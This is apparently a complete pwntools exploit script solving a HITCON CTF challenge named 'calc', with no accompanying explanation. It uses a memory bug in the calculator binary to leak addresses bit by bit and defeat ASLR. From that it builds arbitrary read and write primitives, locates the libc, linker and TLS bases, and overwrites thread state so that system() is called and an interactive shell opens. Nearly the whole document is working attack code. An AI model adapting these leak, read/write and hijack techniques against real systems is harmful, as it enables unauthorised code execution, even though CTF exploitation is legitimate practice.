from pwn import *
import builtins

mask = 0xffffffff
buffering = False
backup = b""

def buffer():
    global buffering
    buffering = True

def flush(after: bytes):
    global buffering, backup
    buffering = False
    p.sendafter(after, backup)
    backup = b""

def send(after: bytes, val, line=False):
    global backup

    match type(val):
        case builtins.int | builtins.str:
            val = f"{val}".encode()
        case builtins.bytes:
            pass
    if line: val += b"\n"
    if buffering:
        backup += val
    else:
        p.sendafter(after, val)

def sendline(after: bytes, val):
    send(after, val, line=True)

if args.REMOTE:
    p = remote("calc.chal.hitconctf.com", "31337")
else:
    p = remote("localhost", 31337)
    context.terminal = ["kitty"]
    script = """
    codebase
    set $arr=(long *)($codebase+0x4b3c8)
    set $calc=(long *)($codebase+0x4b3d0)
    c
    """
    gdb.attach(("localhost", 1234), exe="./calc", gdbscript=script, sysroot="../../")

def narr(vals: list[int]):
    sendline(b":", 1)
    for i in range(6):
        sendline(b":", vals[i])

def narrb(vals: list[int]):
    payload = b"\n".join([f"{n}".encode() for n in vals])
    p.sendlineafter(b":", b"1\n" + payload)
    for _ in range(6):
        p.recvuntil(b":")

def darr():
    sendline(b":", 2)

def ncal(n: int):
    sendline(b":", 3)
    sendline(b":", n)

def dcal():
    sendline(b":", 4)

def calc(op: int):
    sendline(b":", 5)
    sendline(b":", op)
    if buffering:
        return 0
    else:
        p.recvuntil(b"Status: ")
        return int(p.recvline())

def dwords(ns: list[int]):
    ret = []
    for n in ns:
        ret.append(n & mask)
        ret.append((n >> 32) & mask)
    return ret

buffer()
leaks = []
for i in range(32):
    narr([0] * 6)
    darr()

    ncal(-0xaaa9 & mask)
    calc(4)

    for _ in range(2):
        narr([1 << 16] + [0] * 5)
        calc(5)
        darr()

    narr([1 << i] + [0] * 5)
    calc(5)

    leak = calc(2)
    # print(leak)
    # leaks.append(leak)

    dcal()
    darr()

flush(b":")
for i in range(32):
    for _ in range(5):
        p.recvuntil(b"Status: ", timeout=5)
    leaks.append(int(p.recvline()))

leak = int("".join(map(str, leaks)), 2)
log.info(f"{leak = :#x}")

"""
leak = fixup - (upper + UNKNOWN + fixup + other)
leak = fixup - upper - UNKNOWN - fixup - other
UNKNOWN = fixup - upper - fixup - other - leak
"""
upper = 0xaaaa
fixup = -0xaaa9 & mask
other = 0xffffffff
leak = fixup - upper - fixup - leak - other & mask
filebase = (upper << 32) | (leak - 0x77c4)
log.info(f"{filebase = :#x}")

def arbread(addr: int):
    buffer()
    """
    0xa168 + 0xc -> 0x3ca94
    """
    reader = filebase + 0xa168
    ncal(0)
    dcal()
    narr(dwords([reader, addr, 0]))
    lo = calc(2) & mask
    darr()

    ncal(0)
    dcal()
    narr(dwords([reader, addr + 4, 0]))
    hi = calc(2) & mask
    darr()

    flush(b":")
    p.recvuntil(b"Status: ")
    lo = int(p.recvline()) & mask
    p.recvuntil(b"Status: ")
    hi = int(p.recvline()) & mask
    for _ in range(1):
        p.recvuntil(b":")

    return lo | (hi << 32)

def arbwrite(addr: int, val: int):
    buffer()
    """
    0xa168 + 0x8 -> 0x3ca70
    """
    writer = filebase + 0xa168
    ncal(0)
    dcal()
    narr(dwords([writer, addr, val & mask]))
    calc(1)
    darr()

    ncal(0)
    dcal()
    narr(dwords([writer, addr + 4, (val >> 32) & mask]))
    calc(1)
    darr()

    flush(b":")
    for _ in range(2):
        p.recvuntil(b"Status: ")
    for _ in range(1):
        p.recvuntil(b":")

leak = arbread(filebase + 0x47238)
log.info(f"{leak = :#x}")
libcbase = leak - 0x83a94
log.info(f"{libcbase = :#x}")
libc = ELF("./libc.so", checksec=False)
libc.address = libcbase

leak = arbread(libcbase + 0xdacd0)
log.info(f"{leak = :#x}")
linkbase = leak - 0xd1640
log.info(f"{linkbase = :#x}")

leak = arbread(linkbase + 0x189020)
log.info(f"{leak = :#x}")
tls = leak - 0x50
log.info(f"{tls = :#x}")

thread = arbread(tls + 8)
log.info(f"{thread = :#x}")

target = filebase + 0x4b430
shell = libcbase + 0x1f12f
arbwrite(target, libc.sym.system)
arbwrite(target + 8, shell)
arbwrite(thread + 0xe8, target)

p.interactive()

# 0x0000000024ae9d93